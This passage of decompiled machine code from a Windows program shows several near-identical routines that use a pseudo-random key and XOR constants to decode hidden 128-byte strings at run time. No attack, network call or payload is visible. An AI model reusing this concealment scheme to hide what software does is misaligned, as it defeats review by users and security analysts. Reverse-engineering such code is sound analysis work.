    byte_1400DC3F7 = (v5 - 71) ^ 0x15;
    byte_1400DC3F8 = (v5 - 72) ^ 0xDB;
    byte_1400DC3F9 = (v5 - 73) ^ 0x6A;
    byte_1400DC3FA = (v5 - 74) ^ 0xE7;
    byte_1400DC3FB = (v5 - 75) ^ 6;
    byte_1400DC3FC = (v5 - 76) ^ 0x57;
    byte_1400DC3FD = (v5 - 77) ^ 0x97;
    byte_1400DC3FE = (v5 - 78) ^ 0x5B;
    byte_1400DC3FF = (v5 - 79) ^ 0x67;
    byte_1400DC400 = (v5 - 80) ^ 0xA4;
    byte_1400DC401 = (v5 - 81) ^ 0x7A;
    byte_1400DC402 = (v5 - 82) ^ 0x30;
    byte_1400DC403 = (v5 - 83) ^ 0x36;
    byte_1400DC404 = (v5 - 84) ^ 0x35;
    byte_1400DC405 = (v5 - 85) ^ 0xAE;
    byte_1400DC406 = (v5 - 86) ^ 0x3E;
    byte_1400DC407 = (v5 - 87) ^ 0x6E;
    byte_1400DC408 = (v5 - 88) ^ 0xC1;
    byte_1400DC409 = (v5 - 89) ^ 0x33;
    byte_1400DC40A = (v5 - 90) ^ 1;
    byte_1400DC40B = (v5 - 91) ^ 0xB3;
    byte_1400DC40C = (v5 - 92) ^ 0x1D;
    byte_1400DC40D = (v5 - 93) ^ 0x84;
    byte_1400DC40E = (v5 - 94) ^ 0x79;
    byte_1400DC40F = (v5 - 95) ^ 0x6C;
    byte_1400DC410 = (v5 - 96) ^ 0x2A;
    byte_1400DC411 = (v5 - 97) ^ 0xA9;
    byte_1400DC412 = (v5 - 98) ^ 0xC4;
    byte_1400DC413 = (v5 - 99) ^ 0x2F;
    byte_1400DC414 = (v5 - 100) ^ 0x53;
    byte_1400DC415 = (v5 - 101) ^ 0xA;
    byte_1400DC416 = (v5 - 102) ^ 0x74;
    byte_1400DC417 = (v5 - 103) ^ 3;
    byte_1400DC418 = (v5 - 104) ^ 0x58;
    byte_1400DC419 = (v5 - 105) ^ 0x28;
    byte_1400DC41A = (v5 - 106) ^ 0xA5;
    byte_1400DC41B = (v5 - 107) ^ 0x56;
    byte_1400DC41C = (v5 - 108) ^ 0x5C;
    byte_1400DC41D = (v5 - 109) ^ 0xB0;
    byte_1400DC41E = (v5 - 110) ^ 0x53;
    byte_1400DC41F = (v5 - 111) ^ 0xDF;
    byte_1400DC420 = (v5 - 112) ^ 0x71;
    byte_1400DC421 = (v5 - 113) ^ 0x51;
    byte_1400DC422 = (v5 - 114) ^ 0x84;
    byte_1400DC423 = (v5 - 115) ^ 0xEF;
    byte_1400DC424 = (v5 - 116) ^ 0xAD;
    byte_1400DC425 = (v5 - 117) ^ 0xC6;
    byte_1400DC426 = (v5 - 118) ^ 5;
    byte_1400DC427 = (v5 - 119) ^ 0x82;
    byte_1400DC428 = (v5 - 120) ^ 0x91;
    byte_1400DC429 = (v5 - 121) ^ 0x8E;
    byte_1400DC42A = (v5 - 122) ^ 0x17;
    byte_1400DC42B = (v5 - 123) ^ 0xCD;
    byte_1400DC42C = (v5 - 124) ^ 0xD7;
    byte_1400DC42D = (v5 - 125) ^ 0x87;
    byte_1400DC42E = (v5 - 126) ^ 0x8A;
    byte_1400DC42F = (v5 - 127) ^ 8;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x80ui64 )
  {
    sub_140004790(Src, 0x80ui64, 0i64);
    v5 = byte_1400DC3A8;
  }
  if ( (unsigned __int64)v3[3] < 0x10 )
    v6 = v3;
  else
    v6 = *v3;
  memset(v6, 0, 0x80ui64);
  v7 = (unsigned __int64)v3[3] < 0x10;
  v3[2] = (void *)128;
  if ( v7 )
    v8 = v3;
  else
    v8 = (void **)*v3;
  *((_BYTE *)v8 + 128) = 0;
  v9 = 0i64;
  do
  {
    if ( (unsigned __int64)v3[3] < 0x10 )
      v10 = v3;
    else
      v10 = (void **)*v3;
    v11 = byte_1400DC3B0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x80 );
  return v3;
}
// 1400DC370: using guessed type int dword_1400DC370;
// 1400DC374: using guessed type int dword_1400DC374;
// 1400DC378: using guessed type int dword_1400DC378;
// 1400DC37C: using guessed type int dword_1400DC37C;
// 1400DC3A8: using guessed type char byte_1400DC3A8;
// 1400DC3AC: using guessed type int dword_1400DC3AC;
// 1400DC3B1: using guessed type char byte_1400DC3B1;
// 1400DC3B2: using guessed type char byte_1400DC3B2;
// 1400DC3B3: using guessed type char byte_1400DC3B3;
// 1400DC3B4: using guessed type char byte_1400DC3B4;
// 1400DC3B5: using guessed type char byte_1400DC3B5;
// 1400DC3B6: using guessed type char byte_1400DC3B6;
// 1400DC3B7: using guessed type char byte_1400DC3B7;
// 1400DC3B8: using guessed type char byte_1400DC3B8;
// 1400DC3B9: using guessed type char byte_1400DC3B9;
// 1400DC3BA: using guessed type char byte_1400DC3BA;
// 1400DC3BB: using guessed type char byte_1400DC3BB;
// 1400DC3BC: using guessed type char byte_1400DC3BC;
// 1400DC3BD: using guessed type char byte_1400DC3BD;
// 1400DC3BE: using guessed type char byte_1400DC3BE;
// 1400DC3BF: using guessed type char byte_1400DC3BF;
// 1400DC3C0: using guessed type char byte_1400DC3C0;
// 1400DC3C1: using guessed type char byte_1400DC3C1;
// 1400DC3C2: using guessed type char byte_1400DC3C2;
// 1400DC3C3: using guessed type char byte_1400DC3C3;
// 1400DC3C4: using guessed type char byte_1400DC3C4;
// 1400DC3C5: using guessed type char byte_1400DC3C5;
// 1400DC3C6: using guessed type char byte_1400DC3C6;
// 1400DC3C7: using guessed type char byte_1400DC3C7;
// 1400DC3C8: using guessed type char byte_1400DC3C8;
// 1400DC3C9: using guessed type char byte_1400DC3C9;
// 1400DC3CA: using guessed type char byte_1400DC3CA;
// 1400DC3CB: using guessed type char byte_1400DC3CB;
// 1400DC3CC: using guessed type char byte_1400DC3CC;
// 1400DC3CD: using guessed type char byte_1400DC3CD;
// 1400DC3CE: using guessed type char byte_1400DC3CE;
// 1400DC3CF: using guessed type char byte_1400DC3CF;
// 1400DC3D0: using guessed type char byte_1400DC3D0;
// 1400DC3D1: using guessed type char byte_1400DC3D1;
// 1400DC3D2: using guessed type char byte_1400DC3D2;
// 1400DC3D3: using guessed type char byte_1400DC3D3;
// 1400DC3D4: using guessed type char byte_1400DC3D4;
// 1400DC3D5: using guessed type char byte_1400DC3D5;
// 1400DC3D6: using guessed type char byte_1400DC3D6;
// 1400DC3D7: using guessed type char byte_1400DC3D7;
// 1400DC3D8: using guessed type char byte_1400DC3D8;
// 1400DC3D9: using guessed type char byte_1400DC3D9;
// 1400DC3DA: using guessed type char byte_1400DC3DA;
// 1400DC3DB: using guessed type char byte_1400DC3DB;
// 1400DC3DC: using guessed type char byte_1400DC3DC;
// 1400DC3DD: using guessed type char byte_1400DC3DD;
// 1400DC3DE: using guessed type char byte_1400DC3DE;
// 1400DC3DF: using guessed type char byte_1400DC3DF;
// 1400DC3E0: using guessed type char byte_1400DC3E0;
// 1400DC3E1: using guessed type char byte_1400DC3E1;
// 1400DC3E2: using guessed type char byte_1400DC3E2;
// 1400DC3E3: using guessed type char byte_1400DC3E3;
// 1400DC3E4: using guessed type char byte_1400DC3E4;
// 1400DC3E5: using guessed type char byte_1400DC3E5;
// 1400DC3E6: using guessed type char byte_1400DC3E6;
// 1400DC3E7: using guessed type char byte_1400DC3E7;
// 1400DC3E8: using guessed type char byte_1400DC3E8;
// 1400DC3E9: using guessed type char byte_1400DC3E9;
// 1400DC3EA: using guessed type char byte_1400DC3EA;
// 1400DC3EB: using guessed type char byte_1400DC3EB;
// 1400DC3EC: using guessed type char byte_1400DC3EC;
// 1400DC3ED: using guessed type char byte_1400DC3ED;
// 1400DC3EE: using guessed type char byte_1400DC3EE;
// 1400DC3EF: using guessed type char byte_1400DC3EF;
// 1400DC3F0: using guessed type char byte_1400DC3F0;
// 1400DC3F1: using guessed type char byte_1400DC3F1;
// 1400DC3F2: using guessed type char byte_1400DC3F2;
// 1400DC3F3: using guessed type char byte_1400DC3F3;
// 1400DC3F4: using guessed type char byte_1400DC3F4;
// 1400DC3F5: using guessed type char byte_1400DC3F5;
// 1400DC3F6: using guessed type char byte_1400DC3F6;
// 1400DC3F7: using guessed type char byte_1400DC3F7;
// 1400DC3F8: using guessed type char byte_1400DC3F8;
// 1400DC3F9: using guessed type char byte_1400DC3F9;
// 1400DC3FA: using guessed type char byte_1400DC3FA;
// 1400DC3FB: using guessed type char byte_1400DC3FB;
// 1400DC3FC: using guessed type char byte_1400DC3FC;
// 1400DC3FD: using guessed type char byte_1400DC3FD;
// 1400DC3FE: using guessed type char byte_1400DC3FE;
// 1400DC3FF: using guessed type char byte_1400DC3FF;
// 1400DC400: using guessed type char byte_1400DC400;
// 1400DC401: using guessed type char byte_1400DC401;
// 1400DC402: using guessed type char byte_1400DC402;
// 1400DC403: using guessed type char byte_1400DC403;
// 1400DC404: using guessed type char byte_1400DC404;
// 1400DC405: using guessed type char byte_1400DC405;
// 1400DC406: using guessed type char byte_1400DC406;
// 1400DC407: using guessed type char byte_1400DC407;
// 1400DC408: using guessed type char byte_1400DC408;
// 1400DC409: using guessed type char byte_1400DC409;
// 1400DC40A: using guessed type char byte_1400DC40A;
// 1400DC40B: using guessed type char byte_1400DC40B;
// 1400DC40C: using guessed type char byte_1400DC40C;
// 1400DC40D: using guessed type char byte_1400DC40D;
// 1400DC40E: using guessed type char byte_1400DC40E;
// 1400DC40F: using guessed type char byte_1400DC40F;
// 1400DC410: using guessed type char byte_1400DC410;
// 1400DC411: using guessed type char byte_1400DC411;
// 1400DC412: using guessed type char byte_1400DC412;
// 1400DC413: using guessed type char byte_1400DC413;
// 1400DC414: using guessed type char byte_1400DC414;
// 1400DC415: using guessed type char byte_1400DC415;
// 1400DC416: using guessed type char byte_1400DC416;
// 1400DC417: using guessed type char byte_1400DC417;
// 1400DC418: using guessed type char byte_1400DC418;
// 1400DC419: using guessed type char byte_1400DC419;
// 1400DC41A: using guessed type char byte_1400DC41A;
// 1400DC41B: using guessed type char byte_1400DC41B;
// 1400DC41C: using guessed type char byte_1400DC41C;
// 1400DC41D: using guessed type char byte_1400DC41D;
// 1400DC41E: using guessed type char byte_1400DC41E;
// 1400DC41F: using guessed type char byte_1400DC41F;
// 1400DC420: using guessed type char byte_1400DC420;
// 1400DC421: using guessed type char byte_1400DC421;
// 1400DC422: using guessed type char byte_1400DC422;
// 1400DC423: using guessed type char byte_1400DC423;
// 1400DC424: using guessed type char byte_1400DC424;
// 1400DC425: using guessed type char byte_1400DC425;
// 1400DC426: using guessed type char byte_1400DC426;
// 1400DC427: using guessed type char byte_1400DC427;
// 1400DC428: using guessed type char byte_1400DC428;
// 1400DC429: using guessed type char byte_1400DC429;
// 1400DC42A: using guessed type char byte_1400DC42A;
// 1400DC42B: using guessed type char byte_1400DC42B;
// 1400DC42C: using guessed type char byte_1400DC42C;
// 1400DC42D: using guessed type char byte_1400DC42D;
// 1400DC42E: using guessed type char byte_1400DC42E;
// 1400DC42F: using guessed type char byte_1400DC42F;

//----- (00000001400848C0) ----------------------------------------------------
void **__fastcall sub_1400848C0(void *Src)
{
  int v1; // er9
  unsigned int v2; // edi
  void **v3; // rbx
  int v4; // esi
  char v5; // si
  void *v6; // rcx
  bool v7; // cf
  void **v8; // rax
  __int64 v9; // rdx
  void **v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC434;
  v2 = 0;
  v3 = (void **)Src;
  if ( dword_1400DC434 & 1 )
  {
    v5 = byte_1400DC430;
  }
  else
  {
    v4 = 69069 * dword_1400DC378 + 1234567;
    v1 = dword_1400DC434 | 1;
    dword_1400DC378 = v4;
    dword_1400DC434 |= 1u;
    dword_1400DC370 = HIWORD(dword_1400DC370) + 36969 * (unsigned __int16)dword_1400DC370;
    LOBYTE(v4) = (BYTE2(dword_1400DC37C) + 80 * dword_1400DC37C) ^ v4;
    dword_1400DC37C = HIWORD(dword_1400DC37C) + 18000 * (unsigned __int16)dword_1400DC37C;
    v5 = (((unsigned int)dword_1400DC374 >> 13) ^ 32 * dword_1400DC374 ^ dword_1400DC374) + v4;
    dword_1400DC374 ^= ((unsigned int)dword_1400DC374 >> 13) ^ 32 * (dword_1400DC374 ^ (dword_1400DC374 << 12));
    byte_1400DC430 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC434 = v1 | 2;
    byte_1400DC440[0] = v5 ^ 0xDD;
    byte_1400DC441 = (v5 - 1) ^ 0xCE;
    byte_1400DC442 = (v5 - 2) ^ 0xBC;
    byte_1400DC443 = (v5 - 3) ^ 0x4C;
    byte_1400DC444 = (v5 - 4) ^ 0x36;
    byte_1400DC445 = (v5 - 5) ^ 0xD6;
    byte_1400DC446 = (v5 - 6) ^ 0xDA;
    byte_1400DC447 = (v5 - 7) ^ 2;
    byte_1400DC448 = (v5 - 8) ^ 0xC5;
    byte_1400DC449 = (v5 - 9) ^ 0xC5;
    byte_1400DC44A = (v5 - 10) ^ 0xCE;
    byte_1400DC44B = (v5 - 11) ^ 0x75;
    byte_1400DC44C = (v5 - 12) ^ 0x1E;
    byte_1400DC44D = (v5 - 13) ^ 0x7C;
    byte_1400DC44E = (v5 - 14) ^ 0xD8;
    byte_1400DC44F = (v5 - 15) ^ 0x91;
    byte_1400DC450 = (v5 - 16) ^ 0x79;
    byte_1400DC451 = (v5 - 17) ^ 0xE5;
    byte_1400DC452 = (v5 - 18) ^ 0x95;
    byte_1400DC453 = (v5 - 19) ^ 0x77;
    byte_1400DC454 = (v5 - 20) ^ 0x75;
    byte_1400DC455 = (v5 - 21) ^ 0xA1;
    byte_1400DC456 = (v5 - 22) ^ 0xF5;
    byte_1400DC457 = (v5 - 23) ^ 0xBB;
    byte_1400DC458 = v5 - 24;
    byte_1400DC459 = (v5 - 25) ^ 0xAA;
    byte_1400DC45A = (v5 - 26) ^ 0xB1;
    byte_1400DC45B = (v5 - 27) ^ 0x91;
    byte_1400DC45C = (v5 - 28) ^ 0xF7;
    byte_1400DC45D = (v5 - 29) ^ 0x94;
    byte_1400DC45E = (v5 - 30) ^ 0x10;
    byte_1400DC45F = (v5 - 31) ^ 0x69;
    byte_1400DC460 = (v5 - 32) ^ 0x87;
    byte_1400DC461 = ~(v5 - 33);
    byte_1400DC462 = (v5 - 34) ^ 0xC4;
    byte_1400DC463 = (v5 - 35) ^ 0xD4;
    byte_1400DC464 = (v5 - 36) ^ 0x89;
    byte_1400DC465 = (v5 - 37) ^ 0x60;
    byte_1400DC466 = (v5 - 38) ^ 0xB9;
    byte_1400DC467 = (v5 - 39) ^ 0xD2;
    byte_1400DC468 = (v5 - 40) ^ 0x97;
    byte_1400DC469 = (v5 - 41) ^ 0xB5;
    byte_1400DC46A = (v5 - 42) ^ 0xC8;
    byte_1400DC46B = (v5 - 43) ^ 0x7B;
    byte_1400DC46C = (v5 - 44) ^ 0x64;
    byte_1400DC46D = (v5 - 45) ^ 0x62;
    byte_1400DC46E = (v5 - 46) ^ 0xDB;
    byte_1400DC46F = (v5 - 47) ^ 0x17;
    byte_1400DC470 = (v5 - 48) ^ 0xCA;
    byte_1400DC471 = (v5 - 49) ^ 0x58;
    byte_1400DC472 = (v5 - 50) ^ 0x46;
    byte_1400DC473 = (v5 - 51) ^ 0xE3;
    byte_1400DC474 = (v5 - 52) ^ 0x66;
    byte_1400DC475 = (v5 - 53) ^ 0x60;
    byte_1400DC476 = (v5 - 54) ^ 0x75;
    byte_1400DC477 = (v5 - 55) ^ 0xE9;
    byte_1400DC478 = (v5 - 56) ^ 0x20;
    byte_1400DC479 = (v5 - 57) ^ 0xAC;
    byte_1400DC47A = (v5 - 58) ^ 0x71;
    byte_1400DC47B = (v5 - 59) ^ 0x32;
    byte_1400DC47C = (v5 - 60) ^ 0x17;
    byte_1400DC47D = (v5 - 61) ^ 0xEE;
    byte_1400DC47E = (v5 - 62) ^ 0xC8;
    byte_1400DC47F = (v5 - 63) ^ 0xC1;
    byte_1400DC480 = (v5 - 64) ^ 0x66;
    byte_1400DC481 = (v5 - 65) ^ 0x10;
    byte_1400DC482 = (v5 - 66) ^ 0x9F;
    byte_1400DC483 = (v5 - 67) ^ 0xD2;
    byte_1400DC484 = (v5 - 68) ^ 0xC7;
    byte_1400DC485 = (v5 - 69) ^ 0xEF;
    byte_1400DC486 = (v5 - 70) ^ 0xE8;
    byte_1400DC487 = (v5 - 71) ^ 0x4B;
    byte_1400DC488 = (v5 - 72) ^ 0x76;
    byte_1400DC489 = (v5 - 73) ^ 0x18;
    byte_1400DC48A = (v5 - 74) ^ 0xE;
    byte_1400DC48B = (v5 - 75) ^ 0x23;
    byte_1400DC48C = (v5 - 76) ^ 0x61;
    byte_1400DC48D = (v5 - 77) ^ 0xA3;
    byte_1400DC48E = (v5 - 78) ^ 0x5E;
    byte_1400DC48F = (v5 - 79) ^ 0x35;
    byte_1400DC490 = (v5 - 80) ^ 0x73;
    byte_1400DC491 = (v5 - 81) ^ 0x82;
    byte_1400DC492 = (v5 - 82) ^ 0xE0;
    byte_1400DC493 = (v5 - 83) ^ 0xA5;
    byte_1400DC494 = (v5 - 84) ^ 0xDA;
    byte_1400DC495 = (v5 - 85) ^ 0x30;
    byte_1400DC496 = (v5 - 86) ^ 0x36;
    byte_1400DC497 = (v5 - 87) ^ 0x7D;
    byte_1400DC498 = (v5 - 88) ^ 0xFC;
    byte_1400DC499 = (v5 - 89) ^ 0xB1;
    byte_1400DC49A = (v5 - 90) ^ 0xC9;
    byte_1400DC49B = (v5 - 91) ^ 0x96;
    byte_1400DC49C = (v5 - 92) ^ 0x20;
    byte_1400DC49D = (v5 - 93) ^ 0x51;
    byte_1400DC49E = (v5 - 94) ^ 0x2D;
    byte_1400DC49F = (v5 - 95) ^ 0x81;
    byte_1400DC4A0 = (v5 - 96) ^ 0x73;
    byte_1400DC4A1 = (v5 - 97) ^ 0x15;
    byte_1400DC4A2 = (v5 - 98) ^ 0xDC;
    byte_1400DC4A3 = (v5 - 99) ^ 0x1C;
    byte_1400DC4A4 = (v5 - 100) ^ 0x77;
    byte_1400DC4A5 = (v5 - 101) ^ 0x34;
    byte_1400DC4A6 = (v5 - 102) ^ 0xE0;
    byte_1400DC4A7 = (v5 - 103) ^ 0xB8;
    byte_1400DC4A8 = (v5 - 104) ^ 0xCA;
    byte_1400DC4A9 = (v5 - 105) ^ 0xE4;
    byte_1400DC4AA = (v5 - 106) ^ 0xAB;
    byte_1400DC4AB = (v5 - 107) ^ 0x5A;
    byte_1400DC4AC = (v5 - 108) ^ 0xAF;
    byte_1400DC4AD = (v5 - 109) ^ 0x28;
    byte_1400DC4AE = (v5 - 110) ^ 0x33;
    byte_1400DC4AF = (v5 - 111) ^ 0xB;
    byte_1400DC4B0 = (v5 - 112) ^ 0x4E;
    byte_1400DC4B1 = (v5 - 113) ^ 0xB8;
    byte_1400DC4B2 = (v5 - 114) ^ 0xF6;
    byte_1400DC4B3 = (v5 - 115) ^ 0x16;
    byte_1400DC4B4 = (v5 - 116) ^ 0x8D;
    byte_1400DC4B5 = (v5 - 117) ^ 0x75;
    byte_1400DC4B6 = (v5 - 118) ^ 0x2A;
    byte_1400DC4B7 = (v5 - 119) ^ 0x97;
    byte_1400DC4B8 = (v5 - 120) ^ 0x21;
    byte_1400DC4B9 = (v5 - 121) ^ 0x52;
    byte_1400DC4BA = (v5 - 122) ^ 0x11;
    byte_1400DC4BB = (v5 - 123) ^ 0x33;
    byte_1400DC4BC = (v5 - 124) ^ 0xDE;
    byte_1400DC4BD = (v5 - 125) ^ 0x11;
    byte_1400DC4BE = (v5 - 126) ^ 0xAF;
    byte_1400DC4BF = (v5 - 127) ^ 0x63;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x80ui64 )
  {
    sub_140004790(Src, 0x80ui64, 0i64);
    v5 = byte_1400DC430;
  }
  if ( (unsigned __int64)v3[3] < 0x10 )
    v6 = v3;
  else
    v6 = *v3;
  memset(v6, 0, 0x80ui64);
  v7 = (unsigned __int64)v3[3] < 0x10;
  v3[2] = (void *)128;
  if ( v7 )
    v8 = v3;
  else
    v8 = (void **)*v3;
  *((_BYTE *)v8 + 128) = 0;
  v9 = 0i64;
  do
  {
    if ( (unsigned __int64)v3[3] < 0x10 )
      v10 = v3;
    else
      v10 = (void **)*v3;
    v11 = byte_1400DC440[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x80 );
  return v3;
}
// 1400DC370: using guessed type int dword_1400DC370;
// 1400DC374: using guessed type int dword_1400DC374;
// 1400DC378: using guessed type int dword_1400DC378;
// 1400DC37C: using guessed type int dword_1400DC37C;
// 1400DC430: using guessed type char byte_1400DC430;
// 1400DC434: using guessed type int dword_1400DC434;
// 1400DC441: using guessed type char byte_1400DC441;
// 1400DC442: using guessed type char byte_1400DC442;
// 1400DC443: using guessed type char byte_1400DC443;
// 1400DC444: using guessed type char byte_1400DC444;
// 1400DC445: using guessed type char byte_1400DC445;
// 1400DC446: using guessed type char byte_1400DC446;
// 1400DC447: using guessed type char byte_1400DC447;
// 1400DC448: using guessed type char byte_1400DC448;
// 1400DC449: using guessed type char byte_1400DC449;
// 1400DC44A: using guessed type char byte_1400DC44A;
// 1400DC44B: using guessed type char byte_1400DC44B;
// 1400DC44C: using guessed type char byte_1400DC44C;
// 1400DC44D: using guessed type char byte_1400DC44D;
// 1400DC44E: using guessed type char byte_1400DC44E;
// 1400DC44F: using guessed type char byte_1400DC44F;
// 1400DC450: using guessed type char byte_1400DC450;
// 1400DC451: using guessed type char byte_1400DC451;
// 1400DC452: using guessed type char byte_1400DC452;
// 1400DC453: using guessed type char byte_1400DC453;
// 1400DC454: using guessed type char byte_1400DC454;
// 1400DC455: using guessed type char byte_1400DC455;
// 1400DC456: using guessed type char byte_1400DC456;
// 1400DC457: using guessed type char byte_1400DC457;
// 1400DC458: using guessed type char byte_1400DC458;
// 1400DC459: using guessed type char byte_1400DC459;
// 1400DC45A: using guessed type char byte_1400DC45A;
// 1400DC45B: using guessed type char byte_1400DC45B;
// 1400DC45C: using guessed type char byte_1400DC45C;
// 1400DC45D: using guessed type char byte_1400DC45D;
// 1400DC45E: using guessed type char byte_1400DC45E;
// 1400DC45F: using guessed type char byte_1400DC45F;
// 1400DC460: using guessed type char byte_1400DC460;
// 1400DC461: using guessed type char byte_1400DC461;
// 1400DC462: using guessed type char byte_1400DC462;
// 1400DC463: using guessed type char byte_1400DC463;
// 1400DC464: using guessed type char byte_1400DC464;
// 1400DC465: using guessed type char byte_1400DC465;
// 1400DC466: using guessed type char byte_1400DC466;
// 1400DC467: using guessed type char byte_1400DC467;
// 1400DC468: using guessed type char byte_1400DC468;
// 1400DC469: using guessed type char byte_1400DC469;
// 1400DC46A: using guessed type char byte_1400DC46A;
// 1400DC46B: using guessed type char byte_1400DC46B;
// 1400DC46C: using guessed type char byte_1400DC46C;
// 1400DC46D: using guessed type char byte_1400DC46D;
// 1400DC46E: using guessed type char byte_1400DC46E;
// 1400DC46F: using guessed type char byte_1400DC46F;
// 1400DC470: using guessed type char byte_1400DC470;
// 1400DC471: using guessed type char byte_1400DC471;
// 1400DC472: using guessed type char byte_1400DC472;
// 1400DC473: using guessed type char byte_1400DC473;
// 1400DC474: using guessed type char byte_1400DC474;
// 1400DC475: using guessed type char byte_1400DC475;
// 1400DC476: using guessed type char byte_1400DC476;
// 1400DC477: using guessed type char byte_1400DC477;
// 1400DC478: using guessed type char byte_1400DC478;
// 1400DC479: using guessed type char byte_1400DC479;
// 1400DC47A: using guessed type char byte_1400DC47A;
// 1400DC47B: using guessed type char byte_1400DC47B;
// 1400DC47C: using guessed type char byte_1400DC47C;
// 1400DC47D: using guessed type char byte_1400DC47D;
// 1400DC47E: using guessed type char byte_1400DC47E;
// 1400DC47F: using guessed type char byte_1400DC47F;
// 1400DC480: using guessed type char byte_1400DC480;
// 1400DC481: using guessed type char byte_1400DC481;
// 1400DC482: using guessed type char byte_1400DC482;
// 1400DC483: using guessed type char byte_1400DC483;
// 1400DC484: using guessed type char byte_1400DC484;
// 1400DC485: using guessed type char byte_1400DC485;
// 1400DC486: using guessed type char byte_1400DC486;
// 1400DC487: using guessed type char byte_1400DC487;
// 1400DC488: using guessed type char byte_1400DC488;
// 1400DC489: using guessed type char byte_1400DC489;
// 1400DC48A: using guessed type char byte_1400DC48A;
// 1400DC48B: using guessed type char byte_1400DC48B;
// 1400DC48C: using guessed type char byte_1400DC48C;
// 1400DC48D: using guessed type char byte_1400DC48D;
// 1400DC48E: using guessed type char byte_1400DC48E;
// 1400DC48F: using guessed type char byte_1400DC48F;
// 1400DC490: using guessed type char byte_1400DC490;
// 1400DC491: using guessed type char byte_1400DC491;
// 1400DC492: using guessed type char byte_1400DC492;
// 1400DC493: using guessed type char byte_1400DC493;
// 1400DC494: using guessed type char byte_1400DC494;
// 1400DC495: using guessed type char byte_1400DC495;
// 1400DC496: using guessed type char byte_1400DC496;
// 1400DC497: using guessed type char byte_1400DC497;
// 1400DC498: using guessed type char byte_1400DC498;
// 1400DC499: using guessed type char byte_1400DC499;
// 1400DC49A: using guessed type char byte_1400DC49A;
// 1400DC49B: using guessed type char byte_1400DC49B;
// 1400DC49C: using guessed type char byte_1400DC49C;
// 1400DC49D: using guessed type char byte_1400DC49D;
// 1400DC49E: using guessed type char byte_1400DC49E;
// 1400DC49F: using guessed type char byte_1400DC49F;
// 1400DC4A0: using guessed type char byte_1400DC4A0;
// 1400DC4A1: using guessed type char byte_1400DC4A1;
// 1400DC4A2: using guessed type char byte_1400DC4A2;
// 1400DC4A3: using guessed type char byte_1400DC4A3;
// 1400DC4A4: using guessed type char byte_1400DC4A4;
// 1400DC4A5: using guessed type char byte_1400DC4A5;
// 1400DC4A6: using guessed type char byte_1400DC4A6;
// 1400DC4A7: using guessed type char byte_1400DC4A7;
// 1400DC4A8: using guessed type char byte_1400DC4A8;
// 1400DC4A9: using guessed type char byte_1400DC4A9;
// 1400DC4AA: using guessed type char byte_1400DC4AA;
// 1400DC4AB: using guessed type char byte_1400DC4AB;
// 1400DC4AC: using guessed type char byte_1400DC4AC;
// 1400DC4AD: using guessed type char byte_1400DC4AD;
// 1400DC4AE: using guessed type char byte_1400DC4AE;
// 1400DC4AF: using guessed type char byte_1400DC4AF;
// 1400DC4B0: using guessed type char byte_1400DC4B0;
// 1400DC4B1: using guessed type char byte_1400DC4B1;
// 1400DC4B2: using guessed type char byte_1400DC4B2;
// 1400DC4B3: using guessed type char byte_1400DC4B3;
// 1400DC4B4: using guessed type char byte_1400DC4B4;
// 1400DC4B5: using guessed type char byte_1400DC4B5;
// 1400DC4B6: using guessed type char byte_1400DC4B6;
// 1400DC4B7: using guessed type char byte_1400DC4B7;
// 1400DC4B8: using guessed type char byte_1400DC4B8;
// 1400DC4B9: using guessed type char byte_1400DC4B9;
// 1400DC4BA: using guessed type char byte_1400DC4BA;
// 1400DC4BB: using guessed type char byte_1400DC4BB;
// 1400DC4BC: using guessed type char byte_1400DC4BC;
// 1400DC4BD: using guessed type char byte_1400DC4BD;
// 1400DC4BE: using guessed type char byte_1400DC4BE;
// 1400DC4BF: using guessed type char byte_1400DC4BF;

//----- (0000000140084FD0) ----------------------------------------------------
void **__fastcall sub_140084FD0(void *Src)
{
  int v1; // er9
  unsigned int v2; // edi
  void **v3; // rbx
  int v4; // esi
  char v5; // si
  void *v6; // rcx
  bool v7; // cf
  void **v8; // rax
  __int64 v9; // rdx
  void **v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC4C4;
  v2 = 0;
  v3 = (void **)Src;
  if ( dword_1400DC4C4 & 1 )
  {
    v5 = byte_1400DC4C0;
  }
  else
  {
    v4 = 69069 * dword_1400DC378 + 1234567;
    v1 = dword_1400DC4C4 | 1;
    dword_1400DC378 = v4;
    dword_1400DC4C4 |= 1u;
    dword_1400DC370 = HIWORD(dword_1400DC370) + 36969 * (unsigned __int16)dword_1400DC370;
    LOBYTE(v4) = (BYTE2(dword_1400DC37C) + 80 * dword_1400DC37C) ^ v4;
    dword_1400DC37C = HIWORD(dword_1400DC37C) + 18000 * (unsigned __int16)dword_1400DC37C;
    v5 = (((unsigned int)dword_1400DC374 >> 13) ^ 32 * dword_1400DC374 ^ dword_1400DC374) + v4;
    dword_1400DC374 ^= ((unsigned int)dword_1400DC374 >> 13) ^ 32 * (dword_1400DC374 ^ (dword_1400DC374 << 12));
    byte_1400DC4C0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC4C4 = v1 | 2;
    byte_1400DC4D0[0] = v5 ^ 0x12;
    byte_1400DC4D1 = (v5 - 1) ^ 0x97;
    byte_1400DC4D2 = (v5 - 2) ^ 0xA5;
    byte_1400DC4D3 = (v5 - 3) ^ 0x16;
    byte_1400DC4D4 = (v5 - 4) ^ 0xC6;
    byte_1400DC4D5 = (v5 - 5) ^ 0xCF;
    byte_1400DC4D6 = (v5 - 6) ^ 0x18;
    byte_1400DC4D7 = (v5 - 7) ^ 0x23;
    byte_1400DC4D8 = (v5 - 8) ^ 0x85;
    byte_1400DC4D9 = (v5 - 9) ^ 0x62;
    byte_1400DC4DA = (v5 - 10) ^ 0x73;
    byte_1400DC4DB = (v5 - 11) ^ 0x7C;
    byte_1400DC4DC = (v5 - 12) ^ 0xFA;
    byte_1400DC4DD = (v5 - 13) ^ 0xA5;
    byte_1400DC4DE = (v5 - 14) ^ 0x22;
